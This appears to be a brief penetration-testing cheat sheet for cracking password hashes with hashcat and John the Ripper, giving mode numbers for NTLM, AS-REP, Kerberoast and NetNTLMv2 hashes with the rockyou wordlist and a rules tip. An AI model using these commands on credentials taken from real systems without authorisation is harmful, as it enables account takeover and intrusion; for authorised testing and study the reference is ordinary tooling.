Credential cracking — hashcat / john
++++++++++++++++++++++++++++++++++++++++
hashid '<hash>'                      # identify the mode first
hashcat -m 1000  hashes.txt /usr/share/wordlists/rockyou.txt   # NTLM
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP (krb5asrep)
hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt    # Kerberoast (TGS)
hashcat -m 5600  ntlmv2.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2 (Responder)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Add rules when the wordlist alone misses:  -r /usr/share/hashcat/rules/best64.rule
